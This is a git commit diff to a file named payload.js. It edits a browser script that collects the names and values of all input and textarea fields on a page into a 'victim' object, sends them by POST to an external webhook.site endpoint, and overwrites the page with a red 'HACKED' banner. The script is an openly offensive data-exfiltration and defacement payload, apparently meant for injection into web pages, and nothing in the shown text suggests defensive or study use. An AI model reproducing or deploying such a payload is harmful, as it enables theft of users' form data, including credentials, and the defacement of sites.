9519190c579cb858f5f96df22e82559a7a499f2a
Feonixid <laerti.shabani2010@gmail.com>
2025-12-03 00:37:35 +0100

    Update payload.js

--- payload.js
+++ payload.js
@@ -15,14 +15,12 @@
     inputs: Array.from(document.querySelectorAll('input,textarea')).map(i=>({name:i.name||i.id||'',type:i.type,value:i.value.substring(0,100)}))
   };
   
- fetch('https://webhook.site/f3d30d6d-8d88-4fd8-8590-b70007607245', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/json'},
-  body: JSON.stringify(victim)
-})
-
-    .then(()=>console.log('M.M.N'));
-    
-  // Visual confirmation
-  document.body.innerHTML = '<h1 style="color:red">HACKED - All data stolen!</h1>';
+(function(){
+  var victim = { /* your existing victim object */ };
+  fetch('https://webhook.site/f3d30d6d-8d88-4fd8-8590-b70007607245', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(victim)
+  }).then(()=>console.log('Data POSTed!'));
+  document.body.innerHTML = '<h1 style="color:red">HACKED - All data POSTed!</h1>';
 })();
